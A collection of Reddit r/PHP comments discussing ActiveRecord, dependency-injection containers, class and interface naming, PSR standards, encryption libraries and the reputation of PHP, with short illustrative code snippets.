1. ActiveRecord has nothing to do with a god-class. You can build ActiveRecord implementations also without it. If you use a active record implementation that uses a base model, then its the implementation that violates SRP, not the pattern itself. 2. No being able to write unit tests/mocking has nothing to do with ActiveRecord but with the implementation. 3. ActiveRecord does not say that you must tightly couple persistence with the model. You are free to use repositories and just don't use the model-&gt;save() method, or use a implementation that separates those two. Having a `save` method on the model doesn't tightly couple it to a persistence layer, except you implemented it in that way. ActiveRecord is mostly used in RDBMs and means you have a object representation of a `row`/`record` in a table, which makes the `record` active in the way, that it's directly editable using the same structure as in the table with its columns and foreign keys. Whether you use a save method on the active-record model directly is not forced by the pattern. You are free to abstract that away and add additional patterns like Repository to it - it does not become automatically a data-mapper. That being said, the core of ActiveRecord is to think in table records (context of rdbms, also foreign keys map directly etc), and making those available in your application as objects which are mapped with the same structure as its table and its foreign keys. It's more a way of thinking in tables/foreign-keys first than in entities that do not live in a rdbms context. However, describing failures of a ActiveRecord implementation and its wrong usages doesn't let the ActiveRecord pattern itself suffer from the same failures. 
I think many people hate PHP because it has been used for so long on the web that you're more likely to find old, unmaintainable stuff still running. (Do you guys remember the pre-composer stuff? That was awful!)
The most annoying part is that functions and closures have different brace types. I mean wtf.
The same problems that apply to PSR-7 Response also apply to Request. Not every Request object is tied to the current application lifecycle, as you can also create Request objects to serve as parameters to external calls ([Guzzle does this, for example](http://docs.guzzlephp.org/en/latest/request-options.html)).
I think it's because of this: &gt; \+ operator uses StringBuilder internally to do the append. String c = a + b; statement is converted as below by Java compiler. I've not seen this happen in practice. I tried my code above using both JRE 1.7 and 1.8 but it doesn't seem to me that the compiler is converting the + to sb.append()s, and I'm not exactly sure why.
It tends to matter for employment opportunities....
The article may be implementing the strategy pattern, but it does so by modifying service state, which may lead to further problems down the line. The article itself is about implementation details, so I'm picking on it with no regrets. Get rid of the private setter and all is good, everything working as it should ;-)
sure, I meant to suggest that following this approach, I have ended up needing an order of magnitude more classes than interfaces. that will vary from project to project though, of course.
&gt; This right here is the problem. It's not really a problem because the PSR will be implemented anyway since Laravel's implementation will extend the PSR. A Laravel developer can chose to implement just the PSR (_i.e: just the `log`_) or the extension (_`info`, `debug`, `warning`, etc_) and any non-laravel code will use just the code defined by the PSR (_i.e: log_). &gt; You are now tying your code to Laravel's implementation rather than an interface, which is the entire purpose of the PSR. Like I previously said, Laravel will extend the PSR not ignore it; so Laravel's implementation will still be based on a interface which will extend the PSR. 
You know there are IDE's... ?
&gt; another case where using rdlowrey/Auryn solves the problem cleanly Or pretty much any other modern DI system, such as [Aura.Di](https://github.com/auraphp/Aura.Di).
I'm getting more and more into PHP lately and am wondering, how do you handle sessions (cookies) correctly to be as securely as possible? Having a framework like Laravel helps a ton I think, it handles a lot of stuff like that. But as I want to learn as much as possible about this, where would I start from scratch when writing an authentication / login system? Session handling concerns me the most at this moment, and for a lot of guides out there I'm not sure if the methods are still up-to-date. Are there any tips you could give me? From what I understood, these things are most important: * Having a good random number generator for session ids * serving secure via SSL only * fast expiry time * IP and user-client check may not be useful because they are easily simulated (?) * remember-me functionality with 2nd cookie (token and identifier) Am I on the right track with this? What am I missing?
Aura has delegate functions now? It also has recursive dependency injector of the delegate functions?
This comment was constructed using perl
That's just horrible naming... If I have an interface FooRepository, I can call the class PdoFooRepository for example to give it a specific name. Impl should never be used.
So which language has no warts? I haven't had to worry about parameter order in years. This is just not an issue for me.
every language has warts, but other popular languages (except JS) for web apps feel like they have less of of them.
I haven't found one that didn't lack something that I need to write proper OOP code. Like no interfaces or type hinting. Java comes closest I guess, but I really dislike how they are handling null. So far PHP is the only one that ticks all the boxes for me and I keep coming back every time I try another language.
You mean "factories and builders"? Sure, you can use those with Aura.Di.
&gt; Sure, you can use those with Aura.Di. Huh, I wasn't aware of that - so what's the equivalent of this: function createESCredentials(AppConfig $appConfig) { $username = $appConfig-&gt;getElasticsearchUsername(); $password = $appConfig-&gt;getElasticsearchPasword(); return new ESCredentials($username, $password); } $injector-&gt;delegate('ESCredentials', 'createESCredentials'); $injector-&gt;make('ESCredentials'); In Aura.DI?
https://www.youtube.com/watch?v=kxRX6LXDpWs
Someone needs to start an RFC to change `&lt;?php` to `&lt;3php`
I presume this is for a shared instance, in which case: $di-&gt;set('credentials', function () use ($di) { $appConfig = $di-&gt;newInstance(AppConfig::CLASS); // or $appConfig = $di-&gt;get('appConfig'), if you have a shared instance $username = $appConfig-&gt;getElasticsearchUsername(); $password = $appConfig-&gt;getElasticsearchPasword(); return new ESCredentials($username, $password); }); $di-&gt;get('credentials'); That kind of thing has been there since day one; pretty straightforward. I suppose there are other ways, too, e.g. via `$di-&gt;lazyGetCall()` method if you have a factory service. (Note that in Aura DI, *service names* are distinct from *class names*, though they can be the same if you like.) The main point, though, is not the feature of "delegates / automated factories and builders" per se, but that the wiring be in or around the container, not the object-being-used. EDIT: Further, I'd say that the config elements should probably not be extracted from a separate config object, but placed directly in the Aura DI container, perhaps: $di-&gt;params[ESCredentials::CLASS]['username'] = getenv('ES_USERNAME'); $di-&gt;params[ESCredentials::CLASS]['username'] = getenv('ES_PASSWORD'); $di-&gt;set('credentials', $di-&gt;lazyNew(ESCredentials::CLASS); Or use $di-&gt;lazyValue() as a params placeholder, and fill $di-&gt;values later with $_ENV values. Blah blah blah, lots of ways to skin the cat.
This is a fear, not necessarily reality.
You'll always have job opportunities in PHP.
Look at my code - the DI is not being passed into the delegate function, and the delegate function isn't aware of it. Compare that to what you wrote, where: $appConfig = $di-&gt;newInstance(AppConfig::CLASS); the DI is being passed into and used in the delegate function. There is a difference. &gt; I encourage you to explore Aura.Di a little more. :-) Which is why I asked you, but you don't seem to be understanding the question. How, in Aura.DI, do you setup a delegate function that is invoked and can have a dependency passed to it automatically without the delegate function needing to be aware of or passed the DIC?
In your example the dependency of the command is dynamic: it depends on some CLI option. That's bad because what happens if you need to run the same command with a different option *in the same process*? You need to replace the dependency - and if you do you need to replace it everywhere in your application where it has already been injected. In some sort your service/command is no longer stateless, but rather stateful. On the other hand the strategy pattern keeps dependencies static (not dynamic) yet allows to dynamically select the correct one at runtime, which solves the problems mentioned above.
What is the problem with using the container as a SL in a factory?
You're presuming the need for what you're calling a "delegate function." I'm saying that if you want an equivalent delegate creation system in Aura DI, you can do it the way I showed. But I'm further saying that "delegate functions" are not the only way to achieve the end result you're talking about. Any factory/builder system will achieve that functionality; your "delegate functions" are one way of doing that. Again, I encourage you to explore Aura DI a little more, and perhaps work with it before saying what it can't do, and what it can do but in different ways than you're used to.
You should not make your builds depend on a coding convention. Only depend on relevant things like your tests.
tsundere developer
baaaka
Okay... then how are you going to write a framework independent library? 
I'd manipulate the system to become a voter. Muahahaha
I too don't understand where the hate is coming from? PHP is the most common scripting language for web backends and isn't going anywhere in the coming years. Don't take me wrong, it has its problems - the organic growth in the early years, the disputes in internals that can't agree on anything or the fail of PHP6 but everyone who's invested in it can see it's getting better. I mean, every other language that you could use in its place has some problems too, but the programming community seem much more prone to overlook them for some reason. Python? The 2 vs 3 fiasco. Ruby? Basically one framework world. Javascript? Whole language was designed in a hurry and we try to fix it for like what, 20 years? What i want to say, i guess, is i don't really see a point in deeply knowing more than one dynamic scripting language (yeah JS is special since frontend is a monopoly) since now we are more or less on even footing when it comes to language abilities, tooling, productivity and so on. /rant
For the article creation page, I suggest you use CKeditor, it has a very good plugins. I used it on CMS for a news site that I developed months ago with flask. I tried to use yours and it was awful, as the default theme and URLs http://demo.jarves.io/jarves#jarves/dashboard;jarves/pages;jarves/files?path=%2Fbundles;jarves/system/languages;jarves/system/module;jarves/user/users;jarves/user/groups;jarvespublication/category;jarvespublication/comments;jarves/nodes?list[order][type]=asc&amp;&amp;type=edit&amp;selected=jarves%2Fnode%2F3;jarvespublication/news?list[order][title]=asc&amp;&amp;list[language]=en&amp;type=add
Not really sure you can compare abortions to php.ini.
Yeah I think people who dismiss PHP have a poor mindset. Yes PHP has some shitty flaws but it's also a lot more reliable imo. No one should stick to one language, I use a mix of Java, NodeJS and PHP depending on what I need and I feel having these three as my go to puts me ahead. PHP, especially with a framework like Laravel is a great language for prototyping good size web applications. NodeJS is good for making lightweight applications with lots of concurrency needs. Java is something I don't touch much but when I do it's to make applications that I need 100% reliability and to be hardened against mistakes, usually again like with Javascript to solve a single task. I know people who scoff at PHP over the likes of Python/Ruby but to be fair I think both are languages that have a habit of being too experimental with dependancies breaking from just a minor change when PHP has done well to keep a lot of it backwards compatible and garentee easy installing across different OSs. 
There were plenty of other problems, too. The original GUI support (via AWT) was weak, and it didn't integrate well with the web pages it was contained in. It was a bit like a precursor to Flash, except without the UX that Flash eventually offered. As such, many people saw no reason to use it. But it wasn't developed as a marketing ploy. It was developed to run set-top boxes, and repurposed for the web.
Code reviews? Edit: do not have a separate CR just to review the coding style. Never do that. But if you are in a CR and happen to see a violation you should mention it. It's a great way to catch something that otherwise would have been missed.
why thE FUCK DOES MY COMPANY USE COLD FUSION
Okay, not sure what you are getting at here. Could you explain?
Php, the ugly side-chick that sticks around no matter what. 
For some reason, I think questions like these are looking to seek the language with the most internet points.
That just made my evening lol.
If you are writing a library that is not part of any framework, and intended to be used in any framework, you have to only depend on the interface and reimpliment everything else in the library, or you have to break dependency injection and create a hard internal dependency. I'm not sure what's difficult to follow about that. 
I've never specifically hated a language. I've hated runtimes such as Java (due to Oracle's shitty practices), but never the language itself.
I think the point was JS has warts just like PHP and that lauding one while lambasting the other is hipocracy.
But you could have dragged them into the future. Now they'll be stuck in the past. If every good developer passes they'll only be getting the dregs of the programmer pool, getting worse on each iteration.
In his comparison example... &gt;It's like complaining that the movie industry is gonna collapse because kids are making bad videos on their iPhones ...he's comparing PHP = professional camera, JavaScript = kids with iPhones.
* [Getting Started](https://github.com/defuse/php-encryption/blob/master/docs/InstallingAndVerifying.md) * [Upgrading from v1.2](https://github.com/defuse/php-encryption/blob/master/docs/UpgradingFromV1.2.md) * [Tutorial](https://github.com/defuse/php-encryption/blob/master/docs/Tutorial.md) --- Last year, after working on the initial draft of the new `File` API, but before Taylor had written the new documentation (complete with a detailed tutorial covering several use-cases and threat models), I had written a draft blog post. I ended up having to rewrite most of it this evening because the changes are very significant, but I suspect the tutorial is useful enough without it. [Here it is, if you'd like to read it](https://paragonie.com/blog/2016/05/defuse-security-s-php-encryption-library-version-2-0-0-released).
[Reddit Enhancement Suite](http://redditenhancementsuite.com "also /r/Enhancement")
TLDR: of the votes +1's: It affected me directly or indirectly. 0's: why do i add a sign here at all? -1's: Let me discuss semantics instead
No. That's about people complaining about the wrong things with PHP. They complain about stupid, irrelevant stuff, not the real warts.
Topical!
No, you get a vibe from some people that what they're doing is 'enough' and this was one of those places. The interview was pretty dire and the guys I saw working looked pretty hapless. Sadly more often than not I've had the feeling from places that we see a product as already amazing, they hate people who rock the boat and tell them any different or put forward new suggestions.
Depends on if you need that abstract class or not. If you don't need it, you end up with AbstractApple with one direct descendant - Apple. In that case, you don't need the super class (or trait or interface) at all. Backing away from taxonomies, a good abstract class would Cache. It tells you what it is, but nothing specific about it. And good children would be RedisCache, InMemoryCache, FileSystemCache. These tell you exactly what to expect a cache that uses X to store stuff. As for interfaces, these should be adjectives. Cacheable might be a good name. I don't care much for traits/mixins, but I find them occasionally useful (more so in with multiple inheritance). If all else fails, I'd prefer to see CacheableTrait than ICacheable/CacheableInterface. Then you get very clear things like this: interface Cacheable { public function toCache(); public static function fromCache(array $cached); // is this legal? been awhile since I've done php } abstract class Cache { abstract public function store(string $key, Cacheable $value); abstract public retrieve(string $key); } class RedisCache extends Cache {...} class SomeThing implements Cacheable { public __constructor($name, $foo) {...} public toCache() { return ['name' =&gt; $this-&gt;name, 'foo' =&gt; $this-&gt;foo]; } public static fromCache(array $cached) { return new SomeThing($cached['name'], $cached['foo']); } }
I've meandered on this over the years across the languages and I've settled on this simple concept: If you can directly use it, then its type is implied otherwise state what it is. The default with the OOP languages I've used is the concept of an object via classes, so that is implied unless otherwise stated. Going by this, it would be `_Interface` and `_Trait`, but not `_Class` because that's implied by default. This also lends to `_Abstract` for consistency or `Abstract_` for a more common practice. For naming, such as nouns, verbs, adjectives, and adverbs it's all based on context. If you need something that can be removed, then you're making it removable. If it's something more concrete like a controller, then I would use the noun form. For example, I want logging. I want all of my logs to carry the same signatures so I need an interface, but since I can't instantiate an interface directly I declare what it is, `LogInterface`. I also want some common functionality via an abstract, so I'd use `LogAbstract`/`AbstractLog` because I can't instantiate that either. If I want a base model, then that's what I usually call `Log` in this case instead of `BaseLog` or `LogModel`. Context is supplied via namespacing to handle ambiguity. If I want to make some object capable of logging, ie logable, then I use a `LogableTrait`. I also expand this to subsystems in some cases. I will imply a data model as the default and data mappers, gateways, etc as the exceptions. To expand logging for this example, it would be something like `Log` for the data model that is the core, `LogMapper`, `LogGateway`, `LogRepository`, etc. for everything else.
I'm a bit late to mention this, but we're making efforts towards this in WordPress-land! 4.6 is switching from WP_HTTP to [Requests](http://requests.ryanmccue.info/) for HTTP-request-making. While this isn't splitting WP_HTTP out, the two are very similar (I'm the maintainer of both), so it's effectively the same. I'd like to split more out as well eventually. :) Note also, Calypso is a product of Automattic, who run WordPress.com. That's not the same as the WordPress community project, although Calypso is open-source as well. WordPress itself isn't switching to a JS-only frontend like Calypso any time soon, but more moving in the direction of allowing many interfaces, including Calypso and others.
That's why I switched to Ruby *sticks out chest and gets a smug grin*
It seems to offer a very similar API to https://github.com/paragonie/halite. If you had the option to choose between the two libraries for performing symmetric encryption on potentially sensitive data, what would be the pros and cons to each library?
Taylor Hornby actively encourages people to [use libsodium](https://github.com/defuse/php-encryption/issues/256#issuecomment-216596602). Halite uses libsodium. EDIT: This was the comment I was searching for earlier: https://github.com/defuse/php-encryption/issues/64#issuecomment-163690445
I think you've been misunderstood, buddy.
Read this in a rush before leaving for work this morning, and read the previous comment as "everything is mutable by the language design." Complete mixup on my part.
base64_decode ^^^^^I ^^^^^hope ^^^^^the ^^^^^reference ^^^^^is ^^^^^clear ^^^^^enough
which will pay only 10 times less than the jobs in js, c#, java etc. In my local area, php jobs always have salary as "best in industry" for this reason EDIT: I don't live in US, Canada so I am not aware of salary over there
I just think the bigger and more popular a language or tool gets the more hate it gets aswell. Javascript, Java, PHP are all great examples. There is no RIGHT answer I all this anyway, so let everyone use the tool they want without trashing it without any knowledge. 
Well said. The most important point of your comment is this bit... &gt;They can MAKE PHP work for them. I claimed that, too... It seems that this is a turning point in every past Php programmers, where you understands the fallacy in that argument, and switch to better languages. But it seems that one cannot understand that without forcefully made to work in other languages for some amount of time...I mean, if left alone, they will try to keep using Php. And when glance at other languages, they don't see anything shitty things they love in Php (The Php array, for a great example)... And the fact that this thread is top at /r/php shows how insecure php programmers are despite their claim that 'Php is not going anywhere soon'...
I had the same issue and disabled these two "new" checks (for now at least). I would (like to) interpret the specification that extra newlines are alright here. But, I am not dead certain. Nevertheless, I trust that the guy behind PHPCS knows whats he doing so I accept it as a code correction. These things happens and I'm all together quite happy with both PSR-2 and the implementation of it by PHPCS.
Programmers who hate on PHP never know what they're talking about and they're shitty programmers by definition because of it. There are more idiots on Hacker News than people who know what they're taking about. You can't listen to those morons. The funny thing is, the shit they like is often much worse. Javascript anyone? If someone who has worked extensively with PHP hates it I can respect that (never has it happened and I've been programming PHP for over a decade now), but most of these fucking morons have probably never programmed much in their lives and if they have it hasn't been in PHP. I sure as hell wouldn't hire anyone with such idiotic, uninformed, misguided opinions because the only thing they're trying to achieve is acceptance by jumping on a bandwagon that clearly displays their stupidity. **Finally, I can make the same fucking critiques people make about PHP about every single other fucking language out there, without exception.**
I prefix them with T for trait, I for interfaces and C for classes. I prioritize to read from the name, or output of the command ls, what that content of a file is, without looking into the file. I also find it easier to talk code when the name of a class/trait/interface contains its label. &gt; "Hey, we should really change the implementation of TDependable." The above is quicker that to spell it out, like this. &gt; "Hey, we should really change the implementation of the trait Dependable." Minor things, but thats how I tend to do, at least currently.
No. This isn't about name calling. After over ten years of doing both, I cannot say that. If you have actual experience in the language, you have right to voice an actual opinion. Javascript is indeed a very poor language. The problem with people who piss on PHP is that they haven't actually used it and therefore don't have any idea what the fuck they're talking about. I have yet to meet an actual PHP programmer who hates it. 
That's what I thought, it's only a matter of preference but you keep repeating it as a dogma. If one want to use automatic resolution that's fine (I also use that most of the time with PHP-DI), but that doesn't mean other containers are "wrong". I think this is sending a confusing message to the community.
I find them to be pretty comparable in salaries across the whole US.
Humans wasting time on validating code style costs much more than a program doing the same.
I live in India, not US. and php is in demand here because it is easy to "master" and too many php job seekers, I guess. Edit: corrected the quotes
In this case I don't see the point in having the interface at all. I'm not creating type hierarchies for fun. If there's no need for abstractions I don't even have an interface at all. Interfaces are just more or less a special case of an abstract class. They were invented by Java to solve the diamond problem. Don't overrate them.
What?
I want a consistent code style, no matter if work or oss. Do we then agree that for oss CI is acceptable? &gt; you could include editor or ide settings which have the code sniffer &gt; pre-configured, and/or check for coding standards at commit. That doesn't work. I do see that failing a work places. The bigger the company, the more likely you will have one developer not doing so. E.g. just by quickly editing something in a vendor (no commit hooks) folder with vi. And then over time those small inconsistencies will sprinkle around the code base and finally they reach a critical mass where every developer needs to use `git -n` because simple merges of a perfect conforment branch won't work because of those existing tiny inconsitencies. &gt; Keep in mind, a PSR violation is not a business risk Code reviews on diffs which besides a feature also needed to checkin code formatting (so that the commit hook works again) will impact the performance and the quality of the review.
Does "post-PHP3" mean PHP5 or PHP7? Otherwise your experience doesn't count at all. 
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
&gt; that because articles posted in reddit, Hacker News and similar sites are usually coming from developers who enjoy tinkering and learning new stuff Are you implying that enjoying tinkering and learning new stuff is not a thing everybody should do ? Especially in programming ?
Don't you mean easy to learn, not easy to master? Because there are a lot of shitty PHP coders everywhere. They certainly haven't mastered it. 
Please, no YAML, no more. Please. I have something like this in my app: &lt;?php declare(strict_types=1); namespace MyApp\Config; use MyApp\Infrastructure\Environment\GetEnv; return call_user_func(function () { require_once __DIR__ . '/../vendor/autoload.php'; $environmentVariables = array_unique([ SessionMiddlewareFactory::ENV_SYMMETRIC_SESSION_SIGNING_KEY, StripeClientFactory::ENV_STRIPE_SECRET_KEY, StripeClientFactory::ENV_STRIPE_PUBLISHABLE_KEY, Psr7ConnectGatewayFactory::ENV_STRIPE_CONNECT_CLIENT_ID, ConnectionFactory::ENV_POSTGRES_DATABASE_URL, EmailNotifierFactory::ENV_SMTP_HOST, EmailNotifierFactory::ENV_SMTP_PORT, EmailNotifierFactory::ENV_SMTP_USERNAME, EmailNotifierFactory::ENV_SMTP_PASSWORD, EmailNotifierFactory::ENV_NOTIFIER_EMAIL, // ... ]); return [ 'services' =&gt; array_combine($environmentVariables, array_map(new GetEnv(), $environmentVariables)), ]; }); Note: this is cached, of course, as otherwise I'd be autoloading all these classes at each request.
love_php_open_tags=On
 &gt; How do you then reference these in your actual config file? through $_ENV or %key% etc? `require __DIR__ . '/config/environment.php`? This is my "main" config entry-point: &lt;?php declare(strict_types=1); namespace MyApp\Config; return call_user_func(function () : array { require_once __DIR__ . '/../vendor/autoload.php'; return array_merge_recursive( require __DIR__ . '/../config/middlewares.php', require __DIR__ . '/../config/services.php', require __DIR__ . '/../config/command-handlers.php', require __DIR__ . '/../config/projectors.php', require __DIR__ . '/../config/environment.php' ); }); 
My initial thought when opening the link is "WTF!!!! Why is the min supported version of php 5.2?" But that is my reaction from being up reading this at 4am
Ahh, ok got it =) Thanks
Look at how it's used in the library... try getting it right yourself. OpenSSL APIs are terribly difficult to use correctly in way too many situations. And when you get it wrong, it still usually looks right since that's just the nature of crypto. 
Tinkering and learning new stuff is definitely something everyone should do. But it is arrogant to mistake limited experience and exposure gained from tinkering for deep understanding and proficiency in a language. The hate for PHP thrown around is rarely accompanied by sensible understanding of the language, it's history and it's objectives. Rather, it is knee-jerk reaction to the limited exposure from tinkering and learning new stuff. There has been great write ups on shortcoming of the language, and proposals on how to go about fixing them. These form the basis for RFCs and seek to provide positive criticism and positive outcomes.
Ahm, I have my own collection which currently is only one modifier for vendor specific JSON header addition to all responses. But I have some more coming soon to the collection. https://github.com/ThrusterIO/http-middlewares Next, I have a PSR-7 Request modifiers which modifies requests and responses objects before and after application ran. For e.g. parse the multipart request, parse JSON body to ServerRequest::parsedBody, add user-agent for PSR-7 requests on http client, and etc things. https://github.com/ThrusterIO/http-modifiers Their based on https://github.com/ThrusterIO/http-modifier
I posted a similar project recently, I'm very excited for something like this to stabilize and let me write extensions for a language I love in a different language I love. https://www.reddit.com/r/PHP/comments/3uxzn4/sample_php_extension_written_in_go/
http://php.net/manual/en/yaf.tutorials.php the entry script is at root level, it shoul be on a separate folder. It doesn't use namespaces with classes like Yaf_Application It doesn't follow psr-0 or 4 with `IndexController` class inside `controllers/Index.php` file. Even if it has a `modules/models` folder doesn't mention how to use it at all. It seems it only has inline actions.
That's a lot of anger there, buddy.
You shouldn't think of Eloquent as a substitute for writing sql (or stored procs); this is an unfortunate by-product of too many programmers who aren't comfortable with sql and use Eloquent as a way to stitch together functions to write it for them. Eloquent is a system of objects that inter-relate. One part of it is to generate sql for you. There are trade offs with both systems, like anything.
[removed]
&gt; If someone who has worked extensively with PHP hates it I can respect that I moved away from php after 9 years of professional experience with it. Now I hate it with a passion. I now hold the opinion that if you are some one who 'love' php, you don't have enough experience with Php. OR you don't have experience with programming, in general, so that you don't know a good language from a bad one. For example, if you show that in Php "0xe10" == 3600 is true, a newbie will be impressed that you CAN do that. But an experienced programmer will be scared that one is allowed to do that in the language, and will keep away from it. Regarding Javascript, it has some flaws, but they are limited and does not span throughout the entirety of the language...
Not only is PHP a good language (it's easy to learn, easy to use, easy to install and you're free to become a good OOP programmer if you want to) it's also one of the most important FOSS projects out there. To hate on something that's so important to the web as we know it today, is just ignorant.
Java is the most terrible looking language ever, in my opinion. Yes, it forces you to do proper type juggling, but it usually ends up with; `new FileOutputStream(new File(fileName), new BufferOutputStream(new StringReader(new StringBuilder(inputStream))));` I know I know, this is a terrible example, but I bet most of us get the drift.
what makes you think you've mastered it enough to judge others mastery?
It's not buit-in. It's a PECL extension: http://php.net/manual/en/yaf.installation.php This  PECL extension is not bundled with PHP. PHP should remove such documentation from the main docs.
+1. I have no hate towards Yaf, but that is not a place for it in the docs. 
See this is the kind of de-coupling progress I am actually much more interested in. This is great news. Rather than pushing Drupal or WP to extract their own components for others to use, let's start de-re-inventing the wheel and integrate existing standardized components inside those frameworks instead! Composer and Packagist have revolutionized (some would say simply "modernized" heh) PHP development, and it's about time the leading PHP apps started integrating this kind of module-based thinking into their approach. I'm sure this wasn't an easy task, so congrats and thank you for putting in the work!
This would really be nice, can the extensions made with go be integrated into the core? 
We must find this guy and add him to the FIG!
It was written in PHP 5.2 WTF is a PSR? ;)
What's fam?
Thanks your comment. Did you means put extensions in php-src/ext/ directory and compile with php source? I think it's should be, but not test yet.
Love CodeIgniter but hate how easy it is to install and maintain? Have I got a framework for you!
Fucking Bishop Bettini trying to ruin the fun.
Python not widely used on the web!? LOL! * Google * Youtube * Dropbox * Instagram * Pinterest * Quora * Disqus * Spotify * Washington Post * Mozilla * NASA * Bitbucket * Prezi * Eventbrite * Survey Monkey * Yelp Oh and of course **REDDIT**
nice, i though about exactly this a while ago :D
Been using it over a year now. It rocks. Even if you don't take the compiled/performance stuff into consideration, it's generally a good loosely coupled modern framework. And you rarely need to make any changes to your code when upgrading to newer versions. Even the v1 to v2 upgrade which was written in a different language (it was originally just built in plain C, now it's their own language Zephir which generates C) only needed to lines of code changed in my project.
Or simply do it through a `ReflectionClass`: http://php.net/manual/en/reflectionproperty.setvalue.php#example-5815 It's still nasty, though.
You're reviewing some code, and happen to see a coding standard violation. Noting the violation wastes time?
I don't think they should be removed, but it should be a lot clearer what is PHP and what is PECL. Like, "change all blue colors to green" clearer, not "add a size 10 note in the version list".
As `eval` is not a function, it cannot be called dynamically, so it is not a problem. Edit: But now that you mentioned it, the RFC does not cover `assert` ... that's not good.
Oh my god, this is going to be a disaster haha.
I will investigate this.
I wouldn't expect any packages to be there at launch, but I'll surely try throwing something at it :O
Why do you need both an interface and an abstract class that is shared by *all* apples? If it's only shared by *some* apples then you can probably extract a name the embodies that base.
American slang.
I hope it won't be filled with "renamed" forks of already free of charge open source libraries (e.g. $ymfony, aravel, Znd, ii, etc)...
I'm doing uzzle, wig, onolog, vent-dispatcher, onsole, aml, and HPUnit then :P
I think I'll wait for people to start using the libraries that I release for free before I invest any effort in trying to sell them.
uzzle isn't just uzzle. There is uzzle/uzzle and uzzleHttp/uzzle
So, for a specific example. Two years ago I built a large application that is responsible for maintaining a database of election-related information, things like ballots, polling locations, etc. Most of this data is used for a read-only REST API that backs a mobile app. At a certain point, we needed to add an additional field to the Ballot information. This field is stored in the database as an intermediary key used to connect addresses with precincts, but isn't included in the model's table - it can't be because it will be different depending on where that model is being referenced. So, the only way to easily solve this problem without making significant changes to other parts of the system was by creating an entirely separate field in the model that is populated *after* the model is loaded from the database, but from a specific application service. The field is then removed by the model before it allows itself to be saved. The same model has a different valid state depending on where it's loaded.
PHP is heading towards there too, but I kind of like it.
Does anyone have any experience, tips, etc getting extensions into PECL? I'd like to publish my extension, [php-handlebars](https://github.com/jbboehr/php-handlebars), there. Also, does anyone know what the status of Pickle is? I've poked around the Github issues, but haven't seen much activity.
If "Class" added useful information about the contents of the file, then you should. But due to process of elimination, it doesn't, so there is no need. "Interface" makes it clear what the purpose of the file is. You can look for it specifically, see what files in a module are interfaces at a glance etc. Nothing is gained by being implicit about interfaces and abstract classes.
I know right. PHP 3 was release about a decade ago. It's only a couple years after the Windows XP release. It's like comparing the latest OSX with Windows XP. 
You might have latest Ubuntu (16.04, Xenial). It comes with PHP 7, so php5-* packages are not available. Try sudo apt-get install php-fpm php-mysql
sudo add-apt-repository ppa:ondrej/php sudo apt-get update sudo apt-get install php5-fpm
It's basically a lightweight Zend 1 clone. Hasn't really been relevant in years.
What's the problem?
And yet the discussion is ripe with disagreements.... only in the #FIG.
&gt; you keep repeating it as a dogma. Right. Me saying that I find something really useful is 'dogma'. 
Most of the disagreement was how to handle server vs client requests. There was a lot of debate about providing a method for checking as part of the PSR or not. The rest of it is (imo, reasonable) discussion about wording. Full disclosure: I'm the editor of the PSR.
Anyone who is still using shared hosting is absolutely not interested in high performance.
I can't name them the same, since when I have e.g. a middleware-interface, an abstract middleware implementation and a default implementation, they'd all be called `Middleware` and I don't really want to put them all into single namespaces. I don't do it to "know that it's an Interface", I do it to avoid naming clashes and for consistency. It also has a semantic reason, because you don't "use Name;", you "use NameTrait;". Having any entity called "Name" only implies it is a class which instance can contain a name. Now tell me how your "Name" interface can _contain_ a name. It can't, since it's not a container. It's an interface. The implementing class is the container. I follow the Symfony-style regarding this, it always has proven to be the most widely accepted one. Middleware MiddlewareInterface AbstractMiddleware MiddlewareTrait
`__get` and [inflection](https://github.com/Talesoft/tale-inflector/blob/master/Inflector.php). Quite expensive, but consistent. In Doctrine you can also just define a fixed name or use a NamingStrategy (which also uses inflection)
Agreed on all counts, but it doesn't solve the problem for the cases where inheritance is indeed the right tool.
The largest benefit of hinting is documentation in my opinion. Documentation that is enforced to be correct which docblocks aren't. Ducktyping is just horrible. How do you know you are passed the right object? How do you know if not? Do you always open up the class and go read in there what the requirements are? With a type hint it is clear. If you optimize for development speed, good luck. I optimize for maintainability since I don't work on throwaway projects.
Scala is something I want to have a closer look at soon. Haven't done it yet since it seemed like the job market is really small so I focused on the more popular languages first. But it is intriguing anyways.
I still don't fathom why a middleware would receive a response. I know it's copying that pattern from other implementations present in JavaScript, but I just have never had a need for that and it feels really backwards. Middleware should return a response object, not be given one. Is there some use-case I'm missing for passing a response into a middleware?
Disagreements are good. Disagreements around technical points are how we all get better and drive something meaningful forward. If there was no disagreement, then I'd be far more worried. However: Hand-waving around those disagreements (as has been done in the thread) is not. 
If you don't pass a response into a middleware, how could you have middleware that modifies or decorates a response just like we do for requests? As an example, if you wanted to write a middleware to strip whitespace from HTML, wouldn't you need the response to be passed into it?
To me naming things is about "communicating intent". Calling an interface an Apple is not communicating its intent. When I see "Apple" somewhere used in the code I now have to look up it's definition to understand it's an interface. But, if it is called "AppleInterface" I immediately understand what it is, same for traits "AppleTrait" same for service "AppleService" and just an apple "AppleEntity". I.e. there is no such thing as just an "Apple". What you call noise, I call context and a large code base without context is a nightmare to work with. 
Really glad to see a post like this. I was super excited when Phalcon first came to light and tested it almost as soon as they had a version I could test. I was blown away by how awesome it was. Subsequently I was laughed at for trying to use it, too. Nice to know I'm not the only one who really enjoys using it.
Good point! I've been using the ($request, $response, $next) signature for so long that I became blind to the obvious! A side effect of dropping the $response arg is that in order to modify the final content, it must be the first middleware in the stack.
&gt; A side effect of dropping the $response arg is that in order to modify the final content, it must be the first middleware in the stack. Which is actually a really good thing since it prevents spooky-action-at-a-distance. Awesome :D
You clearly have no idea what you are saying, cannot access WHM if you are on shared hosting. Looks like someone doesnt even understand the difference between WHM and CPanel, lol. 
&gt; but how does/could the parser differentiate between references to the class being defined and the imported reference IMO the ideal result is an *error*, with neither name taking precedence. That said, a workaround: namespace Qux { use Foo\Bar\Reader as TheOtherReader; class Reader { public function getReader() { return new TheOtherReader(); } } }
